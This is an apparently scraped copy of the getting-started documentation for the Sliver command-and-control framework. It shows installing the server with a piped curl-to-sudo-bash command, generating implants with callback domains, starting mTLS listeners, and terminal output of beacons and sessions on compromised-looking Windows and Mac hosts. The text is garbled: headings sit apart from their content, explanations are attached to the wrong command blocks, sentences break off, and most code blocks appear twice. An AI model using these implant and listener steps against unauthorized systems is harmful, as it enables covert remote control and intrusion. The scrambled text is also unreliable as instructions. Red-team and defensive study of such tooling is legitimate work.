For a Linux server, you can also use the one liner installation `curl https://sliver.sh/install|sudo bash`
```
sliver > generate --mtls example.com --save /Users/moloch/Desktop --os mac

[*] Generating new darwin/amd64 Sliver binary
[*] Build completed in 00:00:09
[*] Sliver binary saved to: /Users/moloch/Desktop/PROPER_ANTHONY
```

If you install Sliver via the one liner, you can check that the server service is running using `systemctl status sliver`. Note that the Sliver service is not configured to start automatically on boot by default (i.e., if you reboot the server you'll need to start the service again using `systemctl start sliver`):
```
sliver > implants

Name                    OS/Arch        Debug  Format
====                    =======        =====  ======
CAUTIOUS_PANPIPE        darwin/amd64   false  EXECUTABLE
LATE_SUBCOMPONENT       windows/amd64  false  SHARED_LIB
RUBBER_PRINTER          windows/amd64  true   SHARED_LIB
RACIAL_SPECTACLES       darwin/amd64   false  EXECUTABLE
MATHEMATICAL_SASH       darwin/amd64   true   SHARED_LIB
MUSHY_TRADITIONALISM    windows/amd64  false  SHARED_LIB
SICK_SPY                darwin/amd64   false  EXECUTABLE
```

#### System Requirements
### MinGW Setup (Optional, Recommended)
#### Linux (Debian-based)

```
sliver > regenerate --save /Users/moloch/Desktop NEW_GRAPE

[*] Sliver binary saved to: /Users/moloch/Desktop/NEW_GRAPE.exe
```

#### MacOS

```
sliver > mtls

[*] Starting mTLS listener ...
[*] Successfully started job #1

sliver > jobs

ID  Name  Protocol  Port
==  ====  ========  ====
1   mTLS  tcp       8888
```

### Metasploit Setup (Optional)
## Implants: Beacon vs. Session
## Generating Implants
#### Session Mode

```
[*] Session 8ff2ce4c LONG_DRAMATURGE - [::1]:57154 (MacBook-Pro-6.local) - darwin/amd64 - Thu, 20 Jan 2022 15:45:10 CST

sliver > use 8ff2ce4c

[*] Active session LONG_DRAMATURGE (8ff2ce4c-9c66-4cbc-b33c-2a56196536e6)

sliver (LONG_DRAMATURGE) > ls

/Users/moloch/Desktop
=====================
.DS_Store                 6.0 KiB
.localized                0 B
LONG_DRAMATURGE           6.3 MiB
```

#### Beacon Mode

```
[*] Beacon 8c465643 RELATIVE_ADVERTISEMENT - 192.168.1.178:54701 (WIN-1TT1Q345B37) - windows/amd64 - Sat, 22 Jan 2022 14:40:55 CST

[server] sliver > beacons

 ID         Name                     Tasks   Transport   Remote Address        Hostname          Username                        Operating System   Last Check-In    Next Check-In
========== ======================== ======= =========== ===================== ================= =============================== ================== ================ ===============
 8c465643   RELATIVE_ADVERTISEMENT   0/0     mtls        192.168.1.178:54701   WIN-1TT1Q345B37   WIN-1TT1Q345B37\Administrator   windows/amd64      49.385459s ago   37.614549s

[server] sliver > use 8c465643-0e65-45f2-bb7e-acb3480de3cb

[*] Active beacon RELATIVE_ADVERTISEMENT (8c465643-0e65-45f2-bb7e-acb3480de3cb)

[server] sliver (RELATIVE_ADVERTISEMENT) >
```

Some commands/features may not work on "unsupported" platforms.
```
[server] sliver (RELATIVE_ADVERTISEMENT) > tasks

 ID         State       Message Type   Created                         Sent                            Completed
========== =========== ============== =============================== =============================== ===============================
 90294ad2   completed   Ls             Sat, 22 Jan 2022 14:45:00 CST   Sat, 22 Jan 2022 14:45:11 CST   Sat, 22 Jan 2022 14:45:11 CST
 962978a6   completed   Ls             Sat, 22 Jan 2022 14:42:43 CST   Sat, 22 Jan 2022 14:43:53 CST   Sat, 22 Jan 2022 14:43:53 CST
```

The server will also assign code names to each generated binary i.e. `NEW_GRAPE.exe` you can rename the file to anything you need to, but these code names will still uniquely identify the generated binary (they're inserted at compile-time). You can also view all previously generated implant binaries with the `implants` command:
```
[server] sliver (RELATIVE_ADVERTISEMENT) > interactive

[*] Using beacon's active C2 endpoint: mtls://192.168.1.150:8888
[*] Tasked beacon RELATIVE_ADVERTISEMENT (3920e899)

[*] Session 223fac7e RELATIVE_ADVERTISEMENT - 192.168.1.178:54733 (WIN-1TT1Q345B37) - windows/amd64 - Sat, 22 Jan 2022 14:55:24 CST
```

If you need to re-download a previously generated implant use the `regenerate` command, note that positional arguments (the implant name) comes after the command flags (e.g., `--save`):
```
sliver > generate --mtls example.com --http foobar.com --dns 1.lil-peep.rip
```

#### Additional Details
## Getting Shells
Before you can catch the shell, you'll first need to start a listener. You use the commands `mtls`, `http`, `https`, and `dns` to start listeners for each protocol (remember endpoints specified with `--http` can connect to a `https` listener). You can use the `jobs` command to view and manage listeners running in the background. Listeners support both sessions and beacons callbacks:
```
sliver > generate --mtls foo.com,bar.com,baz.com --strategy r
```

`

**Note:** On MacOS you may need to configure [environment variables](/docs?name=Environment+Variables) for MinGW.

See [cross-compiling implants](/docs?name=Cross-compiling+Implants) for more details.

### Metasploit Setup (Optional)

We strongly recommend using the [nightly framework installers](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers), Sliver expects MSF version 6.2+.

## Implants: Beacon vs. Session

Sliver is generally designed as a stage 2 payload, and as such we've not yet endeavored to minimize the implant's file size. Depending on how many protocols you enable in your implant the file can get large, we strongly advise the use of [stagers](/docs?name=Stagers) for actual operations (at least in contexts where one may be concerned about file size). Such is the tradeoff for getting easy static compilation in Golang.

Sliver implants in v1.5 and later support two modes of operation: "beacon mode" and "session mode." Beacon mode implements an asynchronous communication style where the implant periodically checks in with the server retrieves tasks, executes them, and returns the results. In "session mode" the implant will create an interactive real time session using either a persistent connection or using long polling depending on the underlying C2 protocol.

Beacons may be tasked to open interactive sessions over _any C2 protocol they were compiled with_ using the `

`
sliver > generate --mtls example.com --save /Users/moloch/Desktop --os mac

[*] Generating new darwin/amd64 Sliver binary
[*] Build completed in 00:00:09
[*] Sliver binary saved to: /Users/moloch/Desktop/PROPER_ANTHONY
`

`
sliver > implants

Name                    OS/Arch        Debug  Format
====                    =======        =====  ======
CAUTIOUS_PANPIPE        darwin/amd64   false  EXECUTABLE
LATE_SUBCOMPONENT       windows/amd64  false  SHARED_LIB
RUBBER_PRINTER          windows/amd64  true   SHARED_LIB
RACIAL_SPECTACLES       darwin/amd64   false  EXECUTABLE
MATHEMATICAL_SASH       darwin/amd64   true   SHARED_LIB
MUSHY_TRADITIONALISM    windows/amd64  false  SHARED_LIB
SICK_SPY                darwin/amd64   false  EXECUTABLE
`

`
sliver > regenerate --save /Users/moloch/Desktop NEW_GRAPE

[*] Sliver binary saved to: /Users/moloch/Desktop/NEW_GRAPE.exe
`

`
sliver > mtls

[*] Starting mTLS listener ...
[*] Successfully started job #1

sliver > jobs

ID  Name  Protocol  Port
==  ====  ========  ====
1   mTLS  tcp       8888
`

`
[*] Session 8ff2ce4c LONG_DRAMATURGE - [::1]:57154 (MacBook-Pro-6.local) - darwin/amd64 - Thu, 20 Jan 2022 15:45:10 CST

sliver > use 8ff2ce4c

[*] Active session LONG_DRAMATURGE (8ff2ce4c-9c66-4cbc-b33c-2a56196536e6)

sliver (LONG_DRAMATURGE) > ls

/Users/moloch/Desktop
=====================
.DS_Store                 6.0 KiB
.localized                0 B
LONG_DRAMATURGE           6.3 MiB
`

`
[*] Beacon 8c465643 RELATIVE_ADVERTISEMENT - 192.168.1.178:54701 (WIN-1TT1Q345B37) - windows/amd64 - Sat, 22 Jan 2022 14:40:55 CST

[server] sliver > beacons

 ID         Name                     Tasks   Transport   Remote Address        Hostname          Username                        Operating System   Last Check-In    Next Check-In
========== ======================== ======= =========== ===================== ================= =============================== ================== ================ ===============
 8c465643   RELATIVE_ADVERTISEMENT   0/0     mtls        192.168.1.178:54701   WIN-1TT1Q345B37   WIN-1TT1Q345B37\Administrator   windows/amd64      49.385459s ago   37.614549s

[server] sliver > use 8c465643-0e65-45f2-bb7e-acb3480de3cb

[*] Active beacon RELATIVE_ADVERTISEMENT (8c465643-0e65-45f2-bb7e-acb3480de3cb)

[server] sliver (RELATIVE_ADVERTISEMENT) >
`

`

Tasks will execute in the order they were created (FIFO).

**⚠️ IMPORTANT:** Tasks results will block until all tasks that were part of the same "check-in" have completed. If you have one short running and one long running tasks that are executed as part of the same check-in the short task results will wait for the results of the long running task. Consider executing long running tasks on their own interval. This includes tasks assigned by multiple operators, as the implant is not "aware" of the multiple operators.

You can view previous tasks executed by the active beacon using the `

`
[server] sliver (RELATIVE_ADVERTISEMENT) > tasks

 ID         State       Message Type   Created                         Sent                            Completed
========== =========== ============== =============================== =============================== ===============================
 90294ad2   completed   Ls             Sat, 22 Jan 2022 14:45:00 CST   Sat, 22 Jan 2022 14:45:11 CST   Sat, 22 Jan 2022 14:45:11 CST
 962978a6   completed   Ls             Sat, 22 Jan 2022 14:42:43 CST   Sat, 22 Jan 2022 14:43:53 CST   Sat, 22 Jan 2022 14:43:53 CST
`

`
[server] sliver (RELATIVE_ADVERTISEMENT) > interactive

[*] Using beacon's active C2 endpoint: mtls://192.168.1.150:8888
[*] Tasked beacon RELATIVE_ADVERTISEMENT (3920e899)

[*] Session 223fac7e RELATIVE_ADVERTISEMENT - 192.168.1.178:54733 (WIN-1TT1Q345B37) - windows/amd64 - Sat, 22 Jan 2022 14:55:24 CST
`

`

**⚠️ IMPORTANT:** You can only open interactive sessions over C2 protocols that were compiled into the binary. For example, if you did not initially compile an implant with `

`
sliver > generate --mtls example.com --http foobar.com --dns 1.lil-peep.rip
`

`
sliver > generate --mtls foo.com,bar.com,baz.com --strategy r
`

